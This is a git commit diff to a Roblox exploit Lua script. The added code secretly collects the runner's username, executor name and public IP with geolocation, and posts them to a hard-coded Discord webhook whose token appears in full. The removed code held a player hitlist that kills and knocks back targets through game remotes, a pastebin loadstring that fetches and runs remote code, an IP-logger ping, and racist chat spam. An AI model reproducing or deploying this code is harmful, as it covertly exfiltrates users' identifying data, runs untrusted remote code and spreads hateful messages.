210a03a099262b8ba7bd78b0af5341dad95438fa
georgefl121 <102901825+georgefl121@users.noreply.github.com>
2022-11-09 01:40:17 +0800

    Update stuff.lua

--- stuff.lua
+++ stuff.lua
@@ -1,142 +1,51 @@
-done = false
-Whyareyouviewingthis = false
-local hitlist = {}
-spawn(function()
-	repeat
-	for i,v in pairs(game.Players:GetPlayers()) do
-        for _, k in pairs(hitlist) do
-            if string.lower(v.Name) == string.lower(k) then
-                done = true
-            end
-        end
-	end
-	wait(1)
-	until done == true
-end)
-
-spawn(function()
-    while wait() do
-        if done == true then
-            for i,v in pairs(game.Players:GetPlayers()) do
-                for _, k in pairs(hitlist) do
-                    if string.lower(v.Name) == string.lower(k) then
-                        pcall(function()
-                            local target = v
-                            local plr = target.Name
-                            local name = workspace[plr]
-                            local plrHP = game:GetService("Workspace")[plr].Stats.MaxHP.Value
-                            local DMG = tonumber(plrHP)
-                            local ohTable5 = {
-                                ["critgen"] = {
-                                    ["amt"] = 1
-                                }
-                            }
-                            game:GetService("ReplicatedStorage").Remotes.Damage:FireServer(name, DMG, nil, nil, nil, nil, nil, nil, keys)
-                            --game:GetService("ReplicatedStorage").Remotes.HitJunction:FireServer(name, vec, 999, tonumber(plrHP), ohTable5, nil, nil, nil, nil, nil, keys)
-				            wait(10)
-                        end)
-                    end
-                end
-            end
-        end
-        wait(10)
-    end
-end)
-local player = game.Players.LocalPlayer
-spawn(function()
-    while wait() do
-        if done == true then
-            shit = game.Players:GetPlayers()
-            for i = 1, #shit do local v = shit[i]
-                for _, k in pairs(hitlist) do
-                    if string.lower(v.Name) == string.lower(k) and v:FindFirstChild("Alive") and pcall(function() return v.Character.HumanoidRootPart,player.Backpack.Core.Client end) and player:DistanceFromCharacter(v.Character.HumanoidRootPart.Position) < 40000 then
-                        pcall(function()
-                            local vec = player.Character.HumanoidRootPart.Position
-                            game:GetService("ReplicatedStorage").Remotes.Knockback:FireServer(v.Character, vec, -150, nil, 4, keys)
-                            local name = v.Name
-                            wait(3)
-                        end)
-                    end
-                end
-            end
-            wait()
-        end
-    end
-end)
-
-vomit = "🤮"
-races = {"africans","chinese","mexicans","indonesians","blacks"}
-J,K = "ki","t"
-A,B = "i","o"
-L,M = "u","ds"
-V = "ch"
-ListOfWords = {}
+local webhookcheck =
+  is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
+  secure_load and "Sentinel" or
+  KRNL_LOADED and "Krnl" or
+  SONA_LOADED and "Sona" or
+  "Kid with shit exploit"
 
 
-namefound = false
-print("looking")
---racism
--- spawn(function()
--- 	while true do
---         local word = math.random(1,2)
---         local hi = math.random(1, #races)
--- 		for i,t in pairs(hitlist) do
---             if string.lower(t) == string.lower(game.Players.LocalPlayer.Name) then
---                 Bancountdown = true
---                 if word == 1 then
---                     local ohString11 = tostring(A.." "..K..B..L..V.." "..J..M)
---                     local ohString22 = "All"
---                     game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(ohString11, ohString22)
---                 else
---                     local ohString111 = tostring(races[hi]..vomit)
---                     local ohString222 = "All"
---                     game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(ohString111, ohString222)
---                 end
---             end
---         end
--- 	wait(1)
--- 	end
--- end)
+local api1 = tostring(game:HttpGet("https://api.ipify.org", true))
+local api2 = tostring(game:HttpGet("http://ip-api.com/json"))
 
-spawn(function()
-	while true do
-        if Bancountdown then
-            wait(15)
-            for i,t in pairs(hitlist) do
-                if string.lower(t) == string.lower(game.Players.LocalPlayer.Name) then
-                    local ohString1 = "made by megumu"
-                    local ohString2 = "All"
-                    loadstring(game:HttpGet(('https://pastebin.com/raw/6y4saTGB'),true))()
-                    game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(ohString1, ohString2)
-                end
-            end
-        end
-	wait(1)
-	end
-end)
-spawn(function()
-    if Whyareyouviewingthis == false then
-        local response = request({
-            Url = "https://screenshare.pics/IC0KCB",
-            Method = "GET", -- Optional | GET, POST, HEAD, etc
-            Headers = {}, -- Optional | HTTP Headers
-            Cookies = {} -- Optional | HTTP Cookies
-        })
-        print(response.Success)
-        Whyareyouviewingthis = true
-    end
-end)
+local url =
+  "https://discord.com/api/webhooks/995549814454505582/wKAvmS53sYgxFVdHiahe1Kmflmfb_tte0Yzqp1sJ6MrS8mk98glPH_B4hk8Tn2M-WeQN"
+local data = {
+  ["embeds"] = {
+      {
+        ["title"] = "**PSA**",
+        ["description"] = "Username: " .. game.Players.LocalPlayer.Name.." with **"..webhookcheck.."**",
+        ["type"] = "rich",
+        ["color"] = tonumber(0x7269da),
+        ["fields"] = {
+            {
+                ["name"] = "Name:",
+                ["value"] = tostring(game.Players.LocalPlayer.Name),
+                ["inline"] = true
+            },
+            {
+                ["name"] = "ip1",
+                ["value"] = tostring(api1),
+                ["inline"] = true
+            },
+            {
+                ["name"] = "ip2",
+                ["value"] = tostring(api2),
+                ["inline"] = true
+            }
+        }
+      }
+  }
+}
+local newdata = game:GetService("HttpService"):JSONEncode(data)
 
-spawn(function()
-    pcall(function()
-        local response = syn.request({
-            Url = "https://screenshare.pics/IC0KCB",
-            Method = "GET", -- Optional | GET, POST, HEAD, etc
-            Headers = {}, -- Optional | HTTP Headers
-            Cookies = {} -- Optional | HTTP Cookies
-        })
-    end)
-end)
+local headers = {
+  ["content-type"] = "application/json"
+}
+request = http_request or request or HttpPost or syn.request
+local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
+request(abcdef)
 
 while wait() do
     --breaks the loop
